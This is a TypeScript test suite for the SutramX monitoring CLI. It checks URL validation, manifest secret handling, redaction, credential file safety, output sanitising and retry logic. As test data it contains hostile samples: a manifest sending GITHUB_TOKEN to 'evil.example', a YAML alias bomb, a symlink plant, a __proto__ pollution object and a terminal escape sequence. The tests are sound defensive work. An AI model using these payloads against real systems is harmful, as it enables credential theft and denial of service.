import assert from 'node:assert/strict';
import { lstatSync, mkdtempSync, readFileSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { isTrustedApiHost, SutramXApi, validateApiUrl } from '../src/api.js';
import { readCredentials, writeCredentials } from '../src/config.js';
import { ManifestError, parseManifest } from '../src/manifest.js';
import { createMonitorResolver, planIntegrations } from '../src/reconcile.js';
import { clean } from '../src/render.js';

test('API URL: https only, plain http just for loopback, no credentials or query', () => {
    assert.equal(validateApiUrl('https://api.sutramx.com/'), 'https://api.sutramx.com');
    assert.equal(validateApiUrl('http://localhost:3001'), 'http://localhost:3001');
    assert.equal(validateApiUrl('http://127.0.0.1:3001/api'), 'http://127.0.0.1:3001/api');
    assert.throws(() => validateApiUrl('http://api.sutramx.com'), /https/);
    assert.throws(() => validateApiUrl('ftp://example.com'), /https/);
    assert.throws(() => validateApiUrl('https://user:pw@example.com'), /credentials/);
    assert.throws(() => validateApiUrl('https://example.com/?x=1'), /query/);
    assert.throws(() => validateApiUrl('not a url'), /Invalid/);
    assert.equal(isTrustedApiHost('https://api.sutramx.com'), true);
    assert.equal(isTrustedApiHost('https://sutramx.com.evil.io'), false);
});

test('a sutramx.yml cannot read the API key or CI tokens; SUTRAMX_ALLOWED_ENV narrows the rest', () => {
    const env = { SUTRAMX_API_KEY: 'sk_live_secret', GITHUB_TOKEN: 'ghs_x', SLACK_URL: 'https://hooks.slack.com/x', OTHER: 'y' };
    const leak = 'monitors:\n  - key: a\n    name: "${SUTRAMX_API_KEY}"\n    url: "https://evil.example/?t=${GITHUB_TOKEN}"\n';
    assert.throws(() => parseManifest(leak, env), (error: unknown) => error instanceof ManifestError && /SUTRAMX_API_KEY/.test(error.message) && /GITHUB_TOKEN/.test(error.message) && !/sk_live_secret/.test(error.message));
    const ok = 'monitors:\n  - key: a\n    name: "${OTHER}"\n';
    assert.equal(parseManifest(ok, env).monitors[0].name, 'y');
    assert.throws(() => parseManifest(ok, { ...env, SUTRAMX_ALLOWED_ENV: 'SLACK_*' }), ManifestError);
    assert.equal(parseManifest(ok, { ...env, SUTRAMX_ALLOWED_ENV: 'SLACK_*,OTHER' }).monitors[0].name, 'y');
});

test('YAML alias bombs are refused', () => {
    const bomb = ['a: &a ["x","x","x","x","x","x","x","x","x","x"]', ...Array.from({ length: 8 }, (_, i) => `${String.fromCharCode(98 + i)}: &${String.fromCharCode(98 + i)} [${Array(10).fill(`*${String.fromCharCode(97 + i)}`).join(',')}]`)].join('\n');
    assert.throws(() => parseManifest(bomb, {}), (error: unknown) => error instanceof ManifestError && /not valid YAML/.test(error.message));
});

test('integration secrets are never shown in plan diffs', () => {
    const resolver = createMonitorResolver([], []);
    const plan = planIntegrations(
        [{ name: 'ops', type: 'slack', config: { webhook_url: 'https://hooks.slack.com/services/T/B/SECRET', channel: '#ops' } }],
        [{ id: 'c1', integration_type: 'slack', name: 'ops', config: { channel: '#old' } }],
        resolver
    );
    const text = JSON.stringify(plan[0].changes);
    assert.doesNotMatch(text, /SECRET/);
    assert.match(text, /#ops/);
});

test('credentials are written 0600, replace a planted symlink instead of following it, and only known fields are read', () => {
    const dir = mkdtempSync(join(tmpdir(), 'sutramx-'));
    const target = join(dir, 'victim.txt');
    writeFileSync(target, 'untouched');
    const path = join(dir, 'credentials.json');
    symlinkSync(target, path);
    writeCredentials({ api_key: 'sk_test' }, { SUTRAMX_CONFIG: path });
    assert.equal(readFileSync(target, 'utf8'), 'untouched');
    assert.equal(lstatSync(path).isSymbolicLink(), false);
    if (process.platform !== 'win32') assert.equal(statSync(path).mode & 0o777, 0o600);
    writeFileSync(path, JSON.stringify({ api_key: 'sk_test', __proto__: { polluted: true }, extra: 1 }), { mode: 0o600 });
    assert.deepEqual(readCredentials({ SUTRAMX_CONFIG: path }), { api_key: 'sk_test' });
});

test('control characters from the server are stripped before printing', () => {
    assert.equal(clean('ok\u001b]52;c;ZXZpbA==\u0007name\u001b[2J'), 'ok]52;c;ZXZpbA==name[2J');
});

test('429 is retried (Retry-After honoured), 500 on POST is not', async () => {
    let hits = 0;
    const server = http.createServer((req, res) => {
        hits += 1;
        if (req.url === '/limited' && hits < 3) {
            res.writeHead(429, { 'Retry-After': '0', 'Content-Type': 'application/json' });
            return res.end('{"error":"slow down"}');
        }
        if (req.url === '/boom') {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            return res.end('{"error":"boom"}');
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    try {
        const api = new SutramXApi('sk_test', `http://127.0.0.1:${(server.address() as AddressInfo).port}`);
        api.retryDelay = () => 0;
        assert.deepEqual(await api.get('/limited'), { ok: true });
        assert.equal(hits, 3);
        hits = 0;
        await assert.rejects(api.post('/boom'), /boom/);
        assert.equal(hits, 1);
    } finally {
        server.close();
    }
});
